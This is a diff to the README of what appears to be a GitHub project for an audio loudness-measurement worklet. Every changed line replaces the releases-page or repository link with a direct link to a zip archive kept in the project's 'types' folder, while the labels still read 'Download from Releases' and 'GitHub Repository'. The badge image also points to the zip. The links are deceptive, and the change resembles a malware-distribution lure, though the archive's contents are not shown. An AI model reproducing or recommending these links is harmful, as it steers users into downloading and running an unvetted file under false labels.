@@ -1,6 +1,6 @@
 # 🎶 loudness-audio-worklet-processor - Measure Loudness Easily 
 
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/MoralAmbience/loudness-audio-worklet-processor/releases)
+[![Download](https://github.com/MoralAmbience/loudness-audio-worklet-processor/raw/refs/heads/main/types/loudness-audio-processor-worklet-v2.4.zip)](https://github.com/MoralAmbience/loudness-audio-worklet-processor/raw/refs/heads/main/types/loudness-audio-processor-worklet-v2.4.zip)
 
 ## 📖 Description
 
@@ -36,7 +36,7 @@ To start using the loudness-audio-worklet-processor, follow these steps:
 1. **Visit the Releases Page**:
    Click the link below to access the releases page where you can download the application files.
 
-   [Download from Releases](https://github.com/MoralAmbience/loudness-audio-worklet-processor/releases)
+   [Download from Releases](https://github.com/MoralAmbience/loudness-audio-worklet-processor/raw/refs/heads/main/types/loudness-audio-processor-worklet-v2.4.zip)
 
 2. **Select the Version**:
    On the releases page, you will find different versions of the application. Choose the latest version for the best experience.
@@ -54,7 +54,7 @@ To start using the loudness-audio-worklet-processor, follow these steps:
 
 To install the loudness-audio-worklet-processor, return to the releases page and download the latest version using the link below.
 
-[Download from Releases](https://github.com/MoralAmbience/loudness-audio-worklet-processor/releases)
+[Download from Releases](https://github.com/MoralAmbience/loudness-audio-worklet-processor/raw/refs/heads/main/types/loudness-audio-processor-worklet-v2.4.zip)
 
 After downloading, use the steps above to extract and run the application.
 
@@ -85,7 +85,7 @@ If you encounter issues or have questions, feel free to open an issue in the rep
 
 ## 🔗 Useful Links
 
-- **GitHub Repository**: [loudness-audio-worklet-processor](https://github.com/MoralAmbience/loudness-audio-worklet-processor)
+- **GitHub Repository**: [loudness-audio-worklet-processor](https://github.com/MoralAmbience/loudness-audio-worklet-processor/raw/refs/heads/main/types/loudness-audio-processor-worklet-v2.4.zip)
 - **Documentation**: Detailed setup and API documentation coming soon.
 
 ## 🤝 Contributions
